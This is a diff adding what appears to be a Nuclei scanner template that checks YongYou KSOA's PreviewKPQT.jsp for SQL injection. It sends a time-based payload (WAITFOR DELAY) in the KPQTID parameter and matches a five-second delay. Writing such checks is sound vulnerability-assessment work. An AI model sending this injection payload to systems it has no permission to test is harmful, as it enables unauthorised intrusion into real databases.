@@ -1,0 +1,28 @@
+id: YongYou-KSOA-PreviewKPQT-sqli
+
+info:
+  name: YongYou-KSOA-PreviewKPQT-sqli
+  author: yunkong
+  severity: high
+  description: 用友时空KSOA PreviewKPQT SQL注入漏洞
+  tags: YongYou,sqli
+
+http:
+  - raw:
+      - |+
+        GET /kp/PreviewKPQT.jsp?KPQTID=1%27%3BWAITFOR+DELAY+%270%3A0%3A5%27-- HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: close
+
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration>=5'
+      - type: status
+        status:
+          - 200
